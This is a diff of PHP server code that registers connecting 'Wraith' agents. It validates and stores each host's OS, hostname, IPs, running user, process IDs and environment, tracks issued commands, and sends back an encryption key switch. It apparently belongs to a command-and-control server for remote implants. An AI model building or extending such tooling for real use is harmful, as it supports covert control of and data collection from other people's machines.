@@ -47,28 +47,59 @@ class Handler_proto_v_0 {
             if ($this->c_data["req_type"] === "handshake") {
 
                 // Ensure that the required fields are present in the request
+                if (
+                    !has_keys($this->c_data, [
+                        "host_info",
+                        "wraith_info",
+                    ]) ||
+                    !has_keys($this->c_data["host_info"], [
+                        "arch",
+                        "hostname",
+                        "os_type",
+                        "os_version",
+                        "reported_ip",
+                    ]) ||
+                    !has_keys($this->c_data["wraith_info"], [
+                        "version",
+                        "start_time",
+                        "plugins",
+                        "env",
+                        "pid",
+                        "ppid",
+                        "running_user",
+                    ])
+                ) {
 
+                    $this->response["status"] = "ERROR";
+                    $this->response["message"] = "missing required headers";
+
+                    return;
+
+                }
+
+                // Add the connecting IP to the host info array
+                $this->c_data["host_info"]["connecting_ip"] = get_client_ip();
+                // Add a generated fingerprint to the host info array
+                $this->c_data["host_info"]["fingerprint"] = "";
 
                 // Create a database entry for the Wraith
                 db_add_wraiths([[
                     "AssignedID" => uniqid(),
-                    "Fingerprint" => "",
-                    "ReportedIP" => "",
-                    "ConnectingIP" => get_client_ip(),
-                    "OSType" => "",
-                    "SystemName" => "",
-                    "HostUserName" => "",
-                    "WraithVersion" => "",
-                    "WraithStartTime" => "",
-                    "ActivePlugins" => "",
-                    "ConnectionTime" => time(),
+                    "HostProperties" => json_encode($this->c_data["host_info"]),
+                    "WraithProperties" => json_encode($this->c_data["wraith_info"]),
                     "LastHeartbeatTime" => time(),
                     "IssuedCommands" => json_encode([]),
                 ]]);
 
+                // Return a successful status and message
                 $this->response["status"] = "SUCCESS";
                 $this->response["message"] = "handshake successful";
 
+                // Add an encryption key switch command to switch to a
+                // more secure, non-hard-coded encryption key
+                $this->response["switch_key"] = $this->SETTINGS["WraithSwitchCryptKey"];
+
+                // Respond
                 return;
 
             // Wraith is sending heartbeat
